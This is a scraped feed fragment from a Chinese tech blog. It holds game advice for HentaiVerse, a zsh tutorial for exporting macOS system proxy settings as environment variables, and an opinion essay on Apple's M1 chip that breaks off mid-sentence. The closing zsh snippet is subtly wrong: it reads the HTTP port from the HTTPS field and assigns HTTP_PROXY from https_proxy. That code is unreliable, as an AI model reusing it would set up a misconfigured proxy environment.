是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a 